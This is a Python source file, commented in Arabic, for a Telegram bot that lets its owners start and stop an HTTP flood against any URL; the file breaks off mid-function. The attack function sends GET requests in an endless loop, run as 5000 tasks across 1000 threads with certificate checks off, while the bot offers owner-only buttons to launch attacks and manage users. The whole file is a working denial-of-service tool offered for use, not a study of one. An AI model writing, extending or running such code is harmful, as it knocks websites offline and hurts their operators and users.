import requests
import threading
import urllib3
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import logging

# إعداد السجلات
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# تعطيل التحقق من صحة شهادة SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

fake_ip = '182.21.20.32'

# تهيئة الرؤوس القياسية لجلسة requests
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# إنشاء جلسة واحدة للاستخدام المتكرر
session = requests.Session()
session.verify = False
session.headers.update(headers)

# متغير لتخزين عدد البايتات المنقولة
bytes_transferred = 0
lock = threading.Lock()

# متغير لإيقاف الهجوم
stop_attack_event = threading.Event()

# قائمة المالكين
Owner = []
NormalUsers = []

# قراءة القوائم من الملفات
def load_lists():
    global Owner, NormalUsers
    try:
        with open('owner.txt', 'r') as file:
            Owner = file.read().splitlines()
        with open('normal_users.txt', 'r') as file:
            NormalUsers = file.read().splitlines()
    except FileNotFoundError:
        logging.warning("لم يتم العثور على ملفات القوائم. سيتم استخدام القوائم الفارغة.")
        pass

load_lists()

# دالة الهجوم
def attack(url):
    global bytes_transferred
    while not stop_attack_event.is_set():
        try:
            response = session.get(url)
            with lock:
                bytes_transferred += len(response.content)
            logging.info(f"تم إرسال الطلب إلى: {url}")
        except requests.RequestException as e:
            logging.error(f"حدث خطأ: {e}")

# بدء الهجوم
def start_attack(url):
    stop_attack_event.clear()
    with ThreadPoolExecutor(max_workers=1000) as executor:
        futures = [executor.submit(attack, url) for _ in range(5000)]

    for future in futures:
        try:
            future.result()
        except Exception as e:
            logging.error(f"خطأ في تنفيذ الخيط: {e}")

# إيقاف الهجوم
def stop_attack():
    stop_attack_event.set()
    logging.info("تم إيقاف الهجوم.")

# حساب سرعة النقل
def calculate_speed():
    global bytes_transferred
    while not stop_attack_event.is_set():
        time.sleep(1)
        with lock:
            speed = bytes_transferred / (1024 * 1024)  # تحويل البايتات إلى ميغابايت
            bytes_transferred = 0
        logging.info(f"سرعة النقل: {speed:.2f} MB/s")

# إنشاء البوت باستخدام التوكن الخاص بك
TOKEN = 'YOUR_BOT_TOKEN_HERE'
bot = telebot.TeleBot(TOKEN)

# تحقق من صحة المالك
def is_owner(user_id):
    return str(user_id) in Owner

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if is_owner(message.from_user.id):
        bot.reply_to(message, "مرحبًا بك في بوت ديابلو! استخدم القائمة أدناه لاختيار الأوامر.")
    else:
        bot.reply_to(message, "أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")

    # إنشاء الأزرار التفاعلية إذا كان المستخدم مالكًا
    if is_owner(message.from_user.id):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("إضافة مستخدم", callback_data="add_user"))
        markup.add(InlineKeyboardButton("إزالة مستخدم", callback_data="remove_user"))
        markup.add(InlineKeyboardButton("بدء هجوم", callback_data="start_attack"))
        markup.add(InlineKeyboardButton("إيقاف الهجوم", callback_data="stop_attack"))
        bot.send_message(message.chat.id, "اختر أحد الأوامر:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: is_owner(call.message.chat.id))
def callback_query(call):
    if call.data == "add_user":
        msg = bot.send_message(call.message.chat.id, "أدخل معرف المستخدم لإضافته:")
